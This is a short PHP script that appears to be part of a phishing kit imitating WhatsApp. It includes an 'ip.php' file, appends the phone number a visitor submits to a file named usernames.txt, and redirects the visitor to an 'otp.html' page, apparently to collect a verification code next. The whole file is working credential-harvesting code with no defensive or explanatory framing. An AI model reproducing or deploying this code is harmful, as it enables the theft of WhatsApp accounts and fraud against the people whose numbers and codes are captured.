<?php
include 'ip.php';
file_put_contents("usernames.txt", "Whatsapp Phone Number : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
